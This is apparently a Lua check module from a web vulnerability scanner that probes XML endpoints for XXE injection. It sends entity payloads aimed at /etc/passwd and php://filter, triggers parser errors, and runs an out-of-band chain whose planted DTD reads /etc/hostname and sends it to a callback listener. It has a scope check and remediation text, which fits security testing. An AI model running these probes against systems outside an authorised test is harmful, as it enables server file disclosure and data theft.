-- xxe: probes XML-parsing endpoints for XML External Entity injection by
-- POSTing crafted XML documents. Two detection paths run per
-- candidate endpoint:
--
--  1. File disclosure (Critical): SYSTEM entity points at file:///etc/
--     passwd (or php://filter base64-wrapped variant). A
--     TraversalMarkers / base64 prefix hit not present in the baseline
--     proves the parser dereferenced the external entity.
--  2. Error-based (High): malformed DOCTYPE / undefined entity raises
--     a parser-specific error signature (libxml, expat, SAX, xerces,
--     .NET XmlException, ...). A new pattern not in the baseline
--     proves the endpoint parsed our XML even if external entities
--     are sandboxed.
--
-- Candidates (LevelDefault):
--   * Page URL if it advertises an XML Content-Type or path ends .xml.
--   * Every form with method POST/PUT/PATCH.
--   * Every SpecOp with method POST/PUT/PATCH.
-- LevelAggressive also POSTs to the page URL speculatively.
--
-- OOB arm (when an OOB listener is attached):
--   * SYSTEM-entity probe pointing at canary URL.
--   * DTD-exfil chain: planted DTD body + parameter-entity expansion
--     reads /etc/hostname and exfiltrates over HTTP.
-- check.drain emits the OOB findings after the scan's wait window
-- elapses.

local check = {
  name        = "xxe",
  level       = "default",
  scope       = "page",
  cwe         = "CWE-611",
  owasp       = "A05:2021 Security Misconfiguration",
  remediation = "Disable external entity and DTD processing in the XML parser. "
                .. "For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable external general/parameter entities. "
                .. "For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. "
                .. "For PHP libxml, call libxml_disable_entity_loader(true) (or use parsers with externals off by default). "
                .. "For Python lxml, parse with resolve_entities=False and no_network=True. "
                .. "Prefer JSON over XML where the protocol permits.",
}

local BODY_CAP = 32 * 1024

local XXE_VARIANT_SYSTEM         = "oob-system"
local XXE_VARIANT_DTD_LOADER     = "oob-dtd-loader"
local XXE_VARIANT_DTD_EXFIL_RECV = "oob-dtd-exfil-receiver"

-- send dispatches an XML POST/PUT/PATCH with body=doc and reads the
-- response (capped). Returns (request, response, body, truncated,
-- err); on transport failure response/body are nil.
local function send(ctx, cand, doc)
  local req, mut_err = ctx.client:new_request {
    method = cand.method,
    url    = cand.url,
    body   = doc,
    headers = {
      ["Content-Type"] = "application/xml",
      ["Accept"]       = "application/xml, text/xml, */*",
    },
  }
  if mut_err then return nil, nil, nil, false, mut_err end
  local resp, do_err = ctx.client["do"](ctx.client, req)
  if do_err then return req, nil, nil, false, do_err end
  local body, truncated, rerr = resp:read_body_capped(BODY_CAP)
  if rerr then return req, resp, nil, false, rerr end
  return req, resp, body, truncated, nil
end

-- subtract_patterns returns the elements of hits not present in
-- baseline. Used per-payload to drop patterns already present before
-- the XXE payload landed (a docs page that legitimately names
-- /etc/passwd, an error template that mentions libxml).
local function subtract_patterns(hits, baseline)
  local seen = {}
  for _, p in ipairs(baseline) do seen[p] = true end
  local out = {}
  for _, p in ipairs(hits) do
    if not seen[p] then out[#out + 1] = p end
  end
  return out
end

-- page_looks_xml returns true when the page advertises an XML
-- response (Content-Type contains "xml") or the path ends in .xml.
local function page_looks_xml(ctx)
  local headers = ctx.page.headers
  if headers ~= nil then
    local ct = headers:get("Content-Type"):lower()
    if ct:find("xml", 1, true) ~= nil then return true end
  end
  local u, _ = ctx.url.parse(ctx.page.url)
  if u ~= nil and u.path:lower():sub(-4) == ".xml" then return true end
  return false
end

-- candidates assembles the deduped, sorted list of (method, url)
-- pairs to probe. Page URL, forms, and SpecOps all contribute; sorted
-- by URL then method.
local function candidates(ctx, aggressive)
  local seen = {}
  local out = {}
  local function add(method, raw_url)
    method = method:upper()
    if method == "" or raw_url == "" then return end
    local k = method .. "\0" .. raw_url
    if seen[k] then return end
    seen[k] = true
    out[#out + 1] = { method = method, url = raw_url }
  end

  if page_looks_xml(ctx) or aggressive then
    add("POST", ctx.page.url)
  end
  for _, f in ipairs(ctx.page.forms or {}) do
    local m = (f.method or ""):upper()
    if m == "POST" or m == "PUT" or m == "PATCH" then
      add(m, f.action or "")
    end
  end
  for _, op in ipairs(ctx.page.spec_ops or {}) do
    local m = (op.method or ""):upper()
    if m == "POST" or m == "PUT" or m == "PATCH" then
      add(m, op.url or "")
    end
  end
  table.sort(out, function(a, b)
    if a.url ~= b.url then return a.url < b.url end
    return a.method < b.method
  end)
  return out
end

-- probe runs the baseline + payload sweep for one candidate endpoint.
-- Baseline subtracts marker / error hits already present on a benign
-- XML POST so the payload-stage match attributes only the new bytes.
local function probe(ctx, target, cand)
  local _, _, base_body, _, base_err = send(ctx, cand, ctx.xxe.baseline_doc())
  if base_err then return nil, base_err end
  local baseline_markers = ctx.body.traversal_markers(base_body)
  local baseline_errors  = ctx.body.xxe_error_patterns(base_body)
  local baseline_b64     = ctx.body.xxe_base64_markers(base_body)

  -- Phase 1: file disclosure.
  for _, doc in ipairs(ctx.xxe.file_disclose_docs()) do
    local req, resp, body, truncated, err = send(ctx, cand, doc)
    if err then return nil, err end
    local new_hits = subtract_patterns(ctx.body.traversal_markers(body), baseline_markers)
    if #new_hits == 0 then
      local b64 = subtract_patterns(ctx.body.xxe_base64_markers(body), baseline_b64)
      if #b64 > 0 then new_hits = b64 end
    end
    if #new_hits > 0 then
      local probe_url = req:url()
      return {
        severity = ctx.severity.critical,
        target   = target,
        url      = probe_url,
        title    = string.format("XML External Entity (file disclosure) in %s %s", cand.method, probe_url),
        detail   = string.format(
          "Endpoint %s %s parses XML with external entity resolution enabled: an XXE payload referencing "
            .. "%q via a SYSTEM entity caused the response to disclose %q - a sensitive system file. "
            .. "An attacker can read arbitrary files reachable by the server process, probe internal "
            .. "network services, and in some parsers achieve out-of-band data exfiltration or DoS.",
          cand.method, probe_url, ctx.xxe.extract_system_target(doc), new_hits[1]),
        evidence = ctx.evidence.from_exchange {
          request   = req,
          response  = resp,
          body      = body,
          truncated = truncated,
        },
        dedupe_parts = { "endpoint:" .. cand.method .. " " .. probe_url },
      }
    end
  end

  -- Phase 2: error-based.
  for _, doc in ipairs(ctx.xxe.error_docs()) do
    local req, resp, body, truncated, err = send(ctx, cand, doc)
    if err then return nil, err end
    local new_hits = subtract_patterns(ctx.body.xxe_error_patterns(body), baseline_errors)
    if #new_hits > 0 then
      local probe_url = req:url()
      return {
        severity = ctx.severity.high,
        target   = target,
        url      = probe_url,
        title    = string.format("XML External Entity (error-based) in %s %s", cand.method, probe_url),
        detail   = string.format(
          "Endpoint %s %s parses XML and leaks parser error signatures: an XXE-shaped payload "
            .. "triggered the parser error %q. A parser that surfaces these errors is liable to also "
            .. "resolve external entities or expand parameter entities unless explicitly hardened, "
            .. "which would allow arbitrary file disclosure or server-side request forgery.",
          cand.method, probe_url, new_hits[1]),
        evidence = ctx.evidence.from_exchange {
          request   = req,
          response  = resp,
          body      = body,
          truncated = truncated,
        },
        dedupe_parts = { "endpoint:" .. cand.method .. " " .. probe_url },
      }
    end
  end
  return nil
end

-- probe_oob mints a SYSTEM-entity canary and sends one XML doc that
-- dereferences it. The finding is emitted later, in check.drain, from
-- whatever callbacks the listener observed.
local function probe_oob(ctx, target, cand)
  local canary = ctx.oob:register {
    variant = XXE_VARIANT_SYSTEM,
    target  = target,
    method  = cand.method,
    url     = cand.url,
  }
  if canary == nil then return end
  local doc = ctx.xxe.system_oob_doc(canary.http_url)
  local _, _, _, _, err = send(ctx, cand, doc)
  return err
end

-- probe_oob_dtd_exfil plants a parameter-entity DTD on the listener
-- and sends an XML doc that references it via DOCTYPE SYSTEM. The
-- DTD body reads /etc/hostname and POSTs the contents back through a
-- second canary. check.drain emits a finding from whichever pair of
-- callbacks lands.
local function probe_oob_dtd_exfil(ctx, target, cand)
  local exfil = ctx.oob:register {
    variant = XXE_VARIANT_DTD_EXFIL_RECV,
    target  = target,
    method  = cand.method,
    url     = cand.url,
  }
  if exfil == nil then return end
  local dtd_body = ctx.xxe.dtd_template(exfil.http_url, ctx.xxe.oob_exfil_probe_file())
  local loader = ctx.oob:register_asset {
    body         = dtd_body,
    content_type = "application/xml-dtd",
    extra = {
      variant     = XXE_VARIANT_DTD_LOADER,
      exfil_token = exfil.token,
      target      = target,
      method      = cand.method,
      url         = cand.url,
    },
  }
  if loader == nil then return end
  local doc = ctx.xxe.dtd_loader_doc(loader.http_url)
  local _, _, _, _, err = send(ctx, cand, doc)
  return err
end

function check.run(ctx)
  local u, perr = ctx.url.parse(ctx.page.url)
  if perr or u == nil or u.scheme == "" or u.host == "" then return nil end
  if not ctx.scope:allows(ctx.page.url) then return nil end

  local cands = candidates(ctx, ctx:level_at_least("aggressive"))
  if #cands == 0 then return nil end

  local oob_attached = ctx.oob:attached()

  local findings = {}
  local seen = {}
  local first_err
  for _, cand in ipairs(cands) do
    if ctx.scope:allows(cand.url) then
      local f, err = probe(ctx, ctx.page.url, cand)
      if err then
        ctx:report(string.format("probe %s %s: %s", cand.method, cand.url, err))
        if first_err == nil then first_err = err end
      elseif f ~= nil then
        local key = ctx.dedupe.key {
          check  = check.name,
          scope  = "page",
          target = ctx.page.url,
          parts  = f.dedupe_parts,
        }
        if not seen[key] then
          seen[key] = true
          findings[#findings + 1] = f
        end
      end

      if oob_attached then
        local oob_err = probe_oob(ctx, ctx.page.url, cand)
        if oob_err then
          ctx:report(string.format("oob probe %s %s: %s", cand.method, cand.url, oob_err))
        end
        local dtd_err = probe_oob_dtd_exfil(ctx, ctx.page.url, cand)
        if dtd_err then
          ctx:report(string.format("oob dtd-exfil probe %s %s: %s", cand.method, cand.url, dtd_err))
        end
      end
    end
  end

  if first_err and #findings == 0 then return nil, first_err end
  return findings
end

-- format_drain_time renders a Unix-second timestamp in RFC3339 UTC.
local function format_drain_time(unix_secs)
  return os.date("!%Y-%m-%dT%H:%M:%SZ", unix_secs)
end

-- build_oob_finding_system fires whenever the listener observed at
-- least one callback on the SYSTEM-entity canary.
local function build_oob_finding_system(ctx, reg, hits)
  local hit = hits[1]
  local extra = reg.extra or {}
  local target = extra.target or ""
  local method = extra.method or ""
  local endpoint_url = extra.url or ""
  local ua = hit.user_agent or ""
  return {
    severity = ctx.severity.critical,
    target   = target,
    url      = endpoint_url,
    title    = string.format("XML External Entity (OOB-confirmed) in %s %s", method, endpoint_url),
    detail   = string.format(
      "Endpoint %s %s parses XML with external entity resolution enabled and reaches "
        .. "the OOB listener over HTTP: probe with canary %s caused %d callback(s) "
        .. "(first hit: method=%s, source=%s, user-agent=%q). "
        .. "An attacker can chain this into file disclosure (file://), out-of-band data "
        .. "exfiltration via parameter entities, and parser-side SSRF against internal services.",
      method, endpoint_url, reg.http_url, #hits, hit.method, hit.source_addr, ua),
    evidence = ctx.evidence.build {
      method = method,
      url    = endpoint_url,
      snippet = string.format(
        "Canary URL: %s\nFirst hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
        reg.http_url, hit.method, hit.path, hit.source_addr,
        format_drain_time(hit.timestamp_unix), ua, #hits),
    },
    dedupe_parts = { "endpoint:" .. method .. " " .. endpoint_url, "oob" },
  }
end

-- Loader-only hits surface as the High-severity "external DTD fetched"
-- variant; loader + exfil pair surface as the Critical "exfil" variant.
local function build_oob_finding_dtd_exfil(ctx, reg, loader_hits, exfil_hits)
  if #loader_hits == 0 and #exfil_hits == 0 then return nil end
  local extra = reg.extra or {}
  local target = extra.target or ""
  local method = extra.method or ""
  local endpoint_url = extra.url or ""
  local remediation = "Disable external entity AND external DTD subset processing in the XML parser. "
    .. "For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable "
    .. "http://apache.org/xml/features/nonvalidating/load-external-dtd plus "
    .. "http://xml.org/sax/features/external-parameter-entities. "
    .. "For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. "
    .. "For PHP libxml, call libxml_disable_entity_loader(true) and avoid LIBXML_DTDLOAD/LIBXML_DTDATTR. "
    .. "For Python lxml, parse with resolve_entities=False, no_network=True, load_dtd=False."

  if #exfil_hits > 0 then
    local hit = exfil_hits[1]
    local exfil_data = ctx.xxe.extract_exfil_data(hit.path)
    local data_note = "(no data captured; the parameter-entity callback fired with an empty payload, which still proves the chain)"
    if exfil_data ~= "" then
      data_note = string.format("captured payload (URL-decoded): %q", exfil_data)
    end
    local exfil_url = "http://" .. ctx.oob:callback_host() .. "/" .. (extra.exfil_token or "")
    return {
      severity = ctx.severity.critical,
      target   = target,
      url      = endpoint_url,
      title    = string.format("XML External Entity (OOB DTD exfiltration) in %s %s", method, endpoint_url),
      detail   = string.format(
        "Endpoint %s %s parses XML with external DTD processing AND parameter-entity expansion enabled. "
          .. "The check planted an external DTD on canary %s; the parser fetched it, expanded the parameter "
          .. "entity chain, and called back into the exfil canary %s with the contents of %s in the URL. "
          .. "%s. An attacker can read arbitrary server-side files reachable by the parser process and "
          .. "smuggle them out over HTTP without ever needing the response body to echo the disclosure.",
        method, endpoint_url, reg.http_url, exfil_url, ctx.xxe.oob_exfil_probe_file(), data_note),
      remediation = remediation,
      evidence = ctx.evidence.build {
        method = method,
        url    = endpoint_url,
        snippet = string.format(
          "DTD canary URL: %s\nExfil canary URL: %s\nFirst exfil hit: %s %s from %s at %s\nUser-Agent: %s\nExfil hits: %d\nLoader hits: %d\n",
          reg.http_url, exfil_url, hit.method, hit.path, hit.source_addr,
          format_drain_time(hit.timestamp_unix), hit.user_agent or "",
          #exfil_hits, #loader_hits),
      },
      dedupe_parts = { "endpoint:" .. method .. " " .. endpoint_url, "oob-dtd-exfil" },
    }
  end

  local hit = loader_hits[1]
  return {
    severity = ctx.severity.high,
    target   = target,
    url      = endpoint_url,
    title    = string.format("XML External Entity (external DTD fetched) in %s %s", method, endpoint_url),
    detail   = string.format(
      "Endpoint %s %s parses XML with external DTD subset processing enabled: the parser fetched the "
        .. "DOCTYPE-referenced DTD from canary %s (%d hit(s)) but did not call back through the "
        .. "parameter-entity exfil chain the DTD body declared. Some parsers in this state still permit "
        .. "data exfiltration via alternate DTD shapes (error-based, FTP-based) or escalate to file "
        .. "disclosure once parameter-entity expansion is enabled.",
      method, endpoint_url, reg.http_url, #loader_hits),
    remediation = remediation,
    evidence = ctx.evidence.build {
      method = method,
      url    = endpoint_url,
      snippet = string.format(
        "DTD canary URL: %s\nFirst loader hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
        reg.http_url, hit.method, hit.path, hit.source_addr,
        format_drain_time(hit.timestamp_unix), hit.user_agent or "", #loader_hits),
    },
    dedupe_parts = { "endpoint:" .. method .. " " .. endpoint_url, "oob-dtd-loader" },
  }
end

function check.drain(ctx)
  if not ctx.oob:attached() then return nil end
  local findings = {}
  for _, reg in ipairs(ctx.oob:registrations()) do
    local extra = reg.extra or {}
    local variant = extra.variant or ""
    if variant == XXE_VARIANT_DTD_EXFIL_RECV then
      -- Receiver-side registration: handled by its loader sibling so
      -- the report doesn't duplicate the same probe pair.
    elseif variant == XXE_VARIANT_DTD_LOADER then
      local loader_hits = ctx.oob:hits(reg.token)
      local exfil_token = extra.exfil_token or ""
      local exfil_hits = {}
      if exfil_token ~= "" then exfil_hits = ctx.oob:hits(exfil_token) end
      local f = build_oob_finding_dtd_exfil(ctx, reg, loader_hits, exfil_hits)
      if f ~= nil then findings[#findings + 1] = f end
    else
      local hits = ctx.oob:hits(reg.token)
      if #hits > 0 then
        findings[#findings + 1] = build_oob_finding_system(ctx, reg, hits)
      end
    end
  end
  return findings
end

return check
